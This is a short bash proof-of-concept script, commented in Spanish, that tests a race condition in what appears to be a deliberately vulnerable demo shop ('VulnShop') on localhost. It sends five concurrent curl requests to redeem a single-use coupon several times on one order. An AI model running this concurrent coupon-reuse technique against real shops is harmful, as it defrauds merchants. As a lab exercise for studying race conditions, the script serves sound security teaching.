#!/bin/bash
echo "🔓 Testing TOCTOU Vulnerability en VulnShop (Docker)..."

# Reset inicial
curl -X POST http://localhost:3003/api/reset

echo -e "\n📊 Estado inicial:"
curl http://localhost:3003/api/info

echo -e "\n📦 Orden inicial (order1):"
curl http://localhost:3003/api/order/order1

echo -e "\n\n🚀 Test TOCTOU: Aplicando cupón SAVE20 múltiples veces concurrentemente..."
echo "(Cupón limitado a 1 uso, pero debería aplicarse múltiples veces)"

# Enviar 5 aplicaciones concurrentes del mismo cupón
for i in {1..5}; do
  curl -X POST http://localhost:3003/api/apply-coupon \
    -H "Content-Type: application/json" \
    -d '{"userId":"user1","couponCode":"SAVE20","orderId":"order1"}' &
done

wait

echo -e "\n\n📦 Orden final (debería tener múltiples descuentos aplicados):"
curl http://localhost:3003/api/order/order1

echo -e "\n\n📋 Estado de cupones (SAVE20 debería mostrar múltiples usos):"
curl http://localhost:3003/api/coupons